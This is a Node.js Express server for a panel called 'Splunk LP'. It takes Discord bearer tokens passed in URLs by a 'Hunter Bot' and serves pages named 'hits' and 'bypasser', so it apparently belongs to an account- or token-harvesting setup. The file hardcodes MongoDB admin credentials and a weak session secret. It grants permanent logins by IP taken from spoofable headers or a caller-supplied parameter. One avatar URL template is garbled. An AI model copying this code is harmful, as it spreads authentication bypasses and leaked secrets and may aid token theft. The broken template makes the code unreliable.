require('dotenv').config();
const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const session = require('express-session');
const MongoStore = require('connect-mongo');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB (seu link exato)
mongoose.connect("mongodb+srv://admin:lp@cluster.5mwrlvm.mongodb.net/splunklp?retryWrites=true&w=majority");

// Modelo IP confiável
const TrustedIP = mongoose.model('TrustedIP', new mongoose.Schema({
  ip: { type: String, unique: true },
  discordId: String,
  username: String,
  lastSeen: Date
}));

// Session
app.use(session({
  secret: 'adminlp',
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({ mongoUrl: "mongodb+srv://admin:lp@cluster.5mwrlvm.mongodb.net/splunklp" }),
  cookie: { maxAge: 365 * 24 * 60 * 60 * 1000 } // 1 ano
}));

app.use(express.static('public'));

function getIP(req) {
  return req.headers['cf-connecting-ip'] ||
         req.headers['x-forwarded-for']?.split(',')[0] ||
         req.ip;
}

// Página inicial
app.get('/', async (req, res) => {
  const ip = getIP(req);
  const trusted = await TrustedIP.findOne({ ip });
  if (trusted) {
    req.session.user = { id: trusted.discordId, username: trusted.username };
    return res.redirect('/dashboard');
  }
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota que recebe do Hunter Bot
app.get('/sucess', async (req, res) => {
  const { token, ip: hunterIP } = req.query;

  if (!token) return res.send('<h1 style="color:red">Erro: token não recebido</h1>');

  try {
    const { data: user } = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${token}` }
    });

    const realIP = hunterIP || getIP(req);

    // Salva IP como confiável pra sempre
    await TrustedIP.findOneAndUpdate(
      { ip: realIP },
      {
        ip: realIP,
        discordId: user.id,
        username: user.global_name || user.username,
        lastSeen: new Date()
      },
      { upsert: true }
    );

    req.session.user = {
      id: user.id,
      username: user.global_name || user.username,
      avatar: user.avatar ? `https://cdn.discordapp.com/avatars/\( {user.id}/ \){user.avatar}.png` : null
    };

    res.redirect('/dashboard');
  } catch (err) {
    res.send('<h1 style="color:#ff3366">Token inválido ou expirado</h1><a href="/">Voltar</a>');
  }
});

// Rotas do painel (mesmo sistema antigo)
const auth = (req, res, next) => req.session.user ? next() : res.redirect('/');
app.get('/dashboard', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/hits', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'hits.html')));
app.get('/settings', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'settings.html')));
app.get('/bypasser', auth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'bypasser.html')));

app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });

app.listen(PORT, () => console.log('Splunk LP rodando!'));
